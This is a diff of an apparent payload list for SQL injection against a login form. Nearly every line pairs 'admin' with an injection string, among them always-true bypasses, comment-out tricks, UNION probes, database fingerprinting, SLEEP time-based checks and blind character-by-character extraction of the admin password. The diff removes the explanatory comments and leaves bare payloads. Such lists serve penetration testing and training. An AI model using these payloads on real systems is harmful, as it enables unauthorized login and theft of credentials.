@@ -1,95 +1,94 @@
 Username: admin
-Password: ' OR '1'='1 // This payload closes the password string, adds an "OR 1=1" condition (always true), and comments out the rest of the original query.
+Password: ' OR '1'='1
 
 Username: admin
-Password: " OR "1"="1 // Similar to the above, but uses double quotes for environments where strings are quoted with double quotes.
+Password: " OR "1"="1
+Username: admin
+Password: ' OR 1=1--
 
 Username: admin
-Password: ' OR 1=1-- // Closes the password string, adds an "OR 1=1" condition, and uses "--" to comment out the rest of the query.
+Password: " OR 1=1--
 
 Username: admin
-Password: " OR 1=1-- // Similar to the above, but with double quotes.
+Password: ' OR 'a'='a
 
 Username: admin
-Password: ' OR 'a'='a // Closes the password string, adds an "OR 'a'='a'" condition (always true), and comments out the rest.
-
-Username: admin
-Password: " OR "a"="a // Similar to the above, but with double quotes.
+Password: " OR "a"="a
 
 Username: admin' --
-Password: any_password // Injects "admin'" to close the username string, then uses "--" to comment out the password check.
+Password: any_password
 
 Username: admin" --
-Password: any_password // Similar to the above, but with double quotes for the username.
+Password: any_password
 
 Username: admin' #
-Password: any_password // Injects "admin'" to close the username string, then uses "#" to comment out the password check (common in MySQL).
+Password: any_password
 
 Username: admin" #
-Password: any_password // Similar to the above, but with double quotes for the username.
+Password: any_password
 
 Username: admin
-Password: ' OR 1=1 LIMIT 1 // Closes the password string, adds "OR 1=1", and limits the result to 1, often returning the first user (e.g., admin).
+Password: ' OR 1=1 LIMIT 1
 
 Username: admin
-Password: " OR 1=1 LIMIT 1 // Similar to the above, but with double quotes.
+Password: " OR 1=1 LIMIT 1
 
 Username: admin
-Password: ' UNION SELECT null,null,null // Attempts to combine the original query with a new SELECT statement, often used to extract data or bypass authentication if the number of columns matches.
+Password: ' UNION SELECT null,null,null
 
 Username: admin
-Password: " UNION SELECT null,null,null // Similar to the above, but with double quotes.
+Password: " UNION SELECT null,null,null
 
 Username: admin
-Password: ' OR 1=1 /* // Closes the password string, adds "OR 1=1", and uses "/*" to start a multi-line comment, effectively ignoring the rest of the query.
+Password: ' OR 1=1 /*
 
 Username: admin
-Password: " OR 1=1 /* // Similar to the above, but with double quotes.
+Password: " OR 1=1 /*
 
 Username: admin
-Password: ' OR '1'='1' -- // A variation of the basic 'OR 1=1' payload, ensuring the string is properly closed before the comment.
+Password: ' OR '1'='1' --
 
 Username: admin
-Password: " OR "1"="1" -- // Similar to the above, but with double quotes.
+Password: " OR "1"="1" --
 
 Username: admin
-Password: ' OR EXISTS(SELECT 1 FROM users WHERE username = 'admin' AND password IS NOT NULL)-- // Checks if an admin user with a non-null password exists, potentially bypassing authentication if the EXISTS condition is true.
+Password: ' OR EXISTS(SELECT 1 FROM users WHERE username = 'admin' AND password IS NOT NULL)--
 
 Username: admin
-Password: ' OR 1=1 AND (SELECT COUNT(*) FROM information_schema.tables) > 0 -- // A blind SQL injection payload that checks if there are any tables in the database. The application's response (e.g., error or success) indicates the truthfulness.
+Password: ' OR 1=1 AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --
 
 Username: admin
-Password: ' OR 1=1 AND (SELECT SUBSTRING(VERSION(),1,1)) = '5' -- // A blind SQL injection payload to guess the database version. The application's response indicates if the first character of the version is '5'.
+Password: ' OR 1=1 AND (SELECT SUBSTRING(VERSION(),1,1)) = '5' --
 
 Username: admin
-Password: ' OR 1=1 AND SLEEP(5) -- // A time-based blind SQL injection payload. If the condition is true, the database will pause for 5 seconds, indicating the truthfulness of the condition.
+Password: ' OR 1=1 AND SLEEP(5) --
 
 Username: admin
-Password: ' OR 1=1 AND 'a'='a' -- // A boolean-based blind SQL injection payload. If the condition is true, the application might behave differently (e.g., show a success page).
+Password: ' OR 1=1 AND 'a'='a' --
 
 Username: admin
-Password: ' OR 1=1 AND 'a'='b' -- // A boolean-based blind SQL injection payload. If the condition is false, the application might behave differently (e.g., show an error page).
+Password: ' OR 1=1 AND 'a'='b' --
 
 Username: admin
-Password: ' OR 1=1 AND (SELECT @@version LIKE '%MySQL%') -- // Checks if the database is MySQL.
+Password: ' OR 1=1 AND (SELECT @@version LIKE '%MySQL%') --
 
 Username: admin
-Password: ' OR 1=1 AND (SELECT @@version LIKE '%PostgreSQL%') -- // Checks if the database is PostgreSQL.
+Password: ' OR 1=1 AND (SELECT @@version LIKE '%PostgreSQL%') --
 
 Username: admin
-Password: ' OR 1=1 AND (SELECT @@version LIKE '%Microsoft SQL Server%') -- // Checks if the database is Microsoft SQL Server.
+Password: ' OR 1=1 AND (SELECT @@version LIKE '%Microsoft SQL Server%') --
 
 Username: admin
-Password: ' OR 1=1 AND (SELECT @@version LIKE '%Oracle%') -- // Checks if the database is Oracle.
+Password: ' OR 1=1 AND (SELECT @@version LIKE '%Oracle%') --
 
 Username: admin
-Password: ' OR 1=1 AND (SELECT COUNT(*) FROM users) > 0 -- // Checks if there are any users in the 'users' table.
+Password: ' OR 1=1 AND (SELECT COUNT(*) FROM users) > 0 --
 
 Username: admin
-Password: ' OR 1=1 AND (SELECT COUNT(*) FROM users) = 1 -- // Checks if there is exactly one user in the 'users' table.
+Password: ' OR 1=1 AND (SELECT COUNT(*) FROM users) = 1 --
 
 Username: admin
-Password: ' OR 1=1 AND (SELECT LENGTH(password) FROM users WHERE username = 'admin') > 0 -- // Blindly checks if the 'admin' user's password has a length greater than 0.
+Password: ' OR 1=1 AND (SELECT LENGTH(password) FROM users WHERE username = 'admin') > 0 --
 
 Username: admin
-Password: ' OR 1=1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'admin') = 'a' -- // Blindly checks if the first character of the 'admin' user's password is 'a'.
+Password: ' OR 1=1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'admin') = 'a' --
